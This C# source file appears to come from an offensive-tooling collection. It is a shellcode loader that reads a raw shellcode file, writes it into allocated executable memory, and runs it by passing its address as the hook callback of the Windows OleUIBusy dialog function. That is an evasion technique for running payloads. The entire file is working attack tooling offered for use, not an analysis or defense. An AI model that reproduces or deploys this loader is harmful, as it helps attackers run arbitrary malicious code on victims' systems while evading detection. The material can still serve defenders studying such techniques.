// Wra7h/FlavorTown
// Compile with: Visual Studio 2022 & .NET Fx 3.5+
// Usage: this.exe <shellcode file>

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace OleUIBusy
{
    internal class Program
    {
        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("\nNo shellcode specified.");
                Console.WriteLine("Example Usage: OleUIBusy.exe C:\\Path\\To\\Raw\\Shellcode.bin\n");
                System.Environment.Exit(1);
            }

            byte[] payload = System.IO.File.ReadAllBytes(args[0]);

            IntPtr hAlloc = VirtualAlloc(
                            IntPtr.Zero, (uint)payload.Length,
                            0x1000 /*COMMIT*/, 0x40 /*RWX*/);

            Marshal.Copy(payload, 0, hAlloc, payload.Length);

            uint oldProtect;
            VirtualProtectEx(Process.GetCurrentProcess().Handle,
                hAlloc, payload.Length, 0x20/*RX*/, out oldProtect);

            int CF_ENABLEHOOK = 0x8;

            OLEUIBUSY sOleUIBusy = new OLEUIBUSY();
            sOleUIBusy.cbStruct = (uint)Marshal.SizeOf(sOleUIBusy);
            sOleUIBusy.hWndOwner = Process.GetCurrentProcess().MainWindowHandle;
            sOleUIBusy.lpfnHook = hAlloc;

            OleUIBusy(ref sOleUIBusy);
        }

        [DllImport("kernel32")]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            int dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);

        [DllImport("OleDlg.dll")]
        public extern static bool OleUIBusy(ref OLEUIBUSY unnamedParam1);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct OLEUIBUSY
        {
            public uint cbStruct;      
            public uint dwFlags;       
            public IntPtr hWndOwner;
            [MarshalAs(UnmanagedType.LPStr)]
            public string lpszCaption;
            public IntPtr lpfnHook;
            public IntPtr lCustData;     
            public IntPtr hInstance;
            [MarshalAs(UnmanagedType.LPStr)]
            public string lpszTemplate; 
            public IntPtr hResource;
            public IntPtr hTask;
            public IntPtr lphWndDialog;
        }
    }
}
